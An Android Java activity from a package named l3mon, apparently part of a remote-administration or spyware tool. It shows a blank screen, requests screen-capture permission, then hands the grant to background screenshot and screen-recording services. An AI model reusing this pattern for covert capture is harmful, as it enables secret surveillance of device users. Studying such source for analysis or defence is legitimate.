package com.etechd.l3mon;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;


public final class TransparentActivity extends Activity {
    private static final String DURATION = "secs";
    private static final int REQUEST_ID = 1;
    protected Intent intent2;

    @Override
    public void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        if (intent == null) {
            Log.e("TAGG", "data null");
        } else {
            Log.e("TAGG", "data is not null");
        }
        if (i == 1) {
            Log.e("TAGG", "REQUESTCODE OK");
        }
        if (i2 == -1) {
            Log.e("TAGG", "RESULTOK");
        } else {
            Log.e("TAGG", "RESULT NOT OK");
        }
        if (i == 1 && i2 == -1) {
            if (!getIntent().getBooleanExtra("FIRSTTIME", false)) {
                if (getIntent().getIntExtra("flag", -1) == 1) {
                    Log.e("TAGG", "flag 1");
                    try {
                        this.intent2 = new Intent(this, Class.forName("com.etechd.l3mon.Screenshot"));
                    } catch (ClassNotFoundException e) {
                        throw new NoClassDefFoundError(e.getMessage());
                    }
                } else {
                    Log.e("TAGG", "flag 2");
                    try {
                        this.intent2 = new Intent(this, Class.forName("com.etechd.l3mon.ScreenRecorderService"));
                        this.intent2.putExtra("secs", getIntent().getIntExtra("secs", 0));
                    } catch (ClassNotFoundException e2) {
                        throw new NoClassDefFoundError(e2.getMessage());
                    }
                }
                this.intent2.putExtra("resultCode", i2);
                this.intent2.putExtra("android.intent.extra.INTENT", intent);
                startService(this.intent2);
            }
            super.onBackPressed();
        }
    }

    @SuppressLint("NewApi")
    @Override
    public void onCreate(Bundle bundle) {
//        ADRTLogCatReader.onContext(this, "com.aide.ui");
        super.onCreate(bundle);
        TextView textView = new TextView(this);
        textView.setText("");
        setContentView(textView);
        startActivityForResult(((MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE)).createScreenCaptureIntent(), 1);
    }
}
